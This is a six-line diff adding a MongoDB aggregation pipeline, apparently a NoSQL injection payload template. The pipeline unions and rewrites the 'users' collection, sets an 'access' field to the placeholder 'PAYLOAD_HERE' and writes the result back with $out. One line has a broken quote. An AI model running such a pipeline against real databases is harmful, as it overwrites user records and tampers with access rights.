@@ -1,0 +1,6 @@
+[
+    {"$skip": 255},
+    {"$unionWith: "users"},
+    {"$set": {"access": "PAYLOAD_HERE"}},
+    {"$out": "users"}
+]
